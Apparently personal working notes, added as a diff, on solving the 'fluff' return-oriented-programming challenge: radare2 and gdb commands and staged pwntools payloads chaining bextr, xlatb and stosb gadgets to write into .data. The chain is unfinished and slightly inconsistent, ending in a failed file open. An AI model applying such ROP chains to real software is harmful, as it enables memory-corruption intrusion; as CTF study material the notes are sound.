@@ -1,0 +1,54 @@
+From r2
+====
+ir              # Find print_file
+/R pop rdi      # Find pop rdi
+iS |grep rw     # Find writable sections
+pd 10 @ loc.questionableGadgets # Find gadgets
+/ fl            # Find "fl" string
+(gdb) b *0x0040062a ; run < payload.txt; print $al
+/R pop rdi      # Find pop rdi
+
+
+# Writing to rbx ([pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret])
+payload =  b"A" * 40
+payload += pwn.p64(0x0040062a) # bextr
+payload += pwn.p64(64 << 8) # Offset 0 / Len 64
+payload += pwn.p64(0xabcdef - 0x3ef2)
+payload += b"NEXTFUNC"
+(gdb) run < payload.txt # rbx is 0xabcdef and RSP is NEXTFUNC
+
+# Writing to AL
+bextr = pwn.p64(0x0040062a) # [pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret]
+xlatb = pwn.p64(0x00400628) # [xlatb; ret]
+INITIAL_AL_VALUE = 0x0b     # (gdb) b *0x0040062a ; run < payload.txt; print $al
+BYTE_TO_WRITE = 0x4003c4 # "fl" (radare2: / fl)
+payload =  b"A" * 40
+payload += bextr
+payload += pwn.p64(64 << 8) # Offset 0 / Len 64
+payload += pwn.p64(byte_to_write - 0x0b - 0x3ef2)
+payload += xlatb
+payload += b"NEXTFUNC"
+(gdb) run < payload.txt # $al == 0x66 == 'f'
+
+# Print to section
+bextr = pwn.p64(0x0040062a) # [pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret]
+xlatb = pwn.p64(0x00400628) # [xlatb; ret]
+stosb = pwn.p64(0x00400639) # [stosb byte [rdi], al; ret]
+INITIAL_AL_VALUE = 0x0b     # b *0x0040062a ; run < payload.txt; print $al
+BYTE_TO_WRITE = 0x4003c4 # "fl" (radare2: / fl)
+payload =  b"A" * 40
+payload += bextr
+payload += pwn.p64(64 << 8) # Offset 0 / Len 64
+payload += pwn.p64(BYTE_TO_WRITE - 0x0b - 0x3ef2)
+payload += xlatb
+payload += pwn.p64(0x004006a3) # [pop rdi; ret]
+payload += pwn.p64(0x00601028) # .data section
+payload += stosb
+payload += b"NEXTFUNC"
+(gdb) run < payload.txt # rdi == 0x00601029 ; 0x00601028 == 'f'; RSP == "NEXTFUNC"
+
+# Print file
+payload += pwn.p64(0x004006a3) # [pop rdi; ret]
+payload += pwn.p64(0x00601028) # .data section
+payload += pwn.p64(0x00400510)
+./fluff < payload.txt # Failed to open file: f
